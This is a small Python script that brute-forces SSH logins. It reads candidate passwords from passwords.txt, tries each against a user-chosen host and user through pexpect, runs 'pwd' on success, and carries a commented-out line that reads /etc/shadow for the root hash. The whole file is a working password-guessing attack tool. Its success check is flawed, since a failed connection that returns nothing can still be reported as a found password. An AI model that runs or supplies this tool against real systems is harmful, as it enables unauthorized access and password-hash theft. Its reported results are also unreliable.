#!/usr/bin/python
# Log in and get the passwords file

import pexpect
from termcolor import colored

PROMPT = ['# ','\$ ', '>>> ', '> ']

def connect(host, user, password):
    # Connect to the host
    sshNewKey = 'Are you sure you want to continue connecting'
    connStr = 'ssh -oHostKeyAlgorithms=+ssh-dss ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, sshNewKey, '[P|p]assword:'])
    if ret == 0:
        print('[-] Error connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
        if ret == 0:
            print('[-] Error connecting.')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)    
    return child
            
def sendCommand(childConn, command):
    # Send a command
    childConn.sendline(command)
    childConn.expect(PROMPT)
    print(childConn.before)

def main():
    host = input('host IP to connect to: ')
    user = input('user name to test: ')
    file = open('passwords.txt','r')
    for password in file.readlines():
        try:
            password = password.strip('\n')
            child = connect(host, user, password)
            print(colored('[+] Password found: {}'.format(password),'green'))
            sendCommand(child, 'pwd')
        except:
            print(colored('[-] Password failed: {}'.format(password),'red'))

#    sendCommand(child, 'cat /etc/shadow | grep root')
    
if __name__ == '__main__':
    main()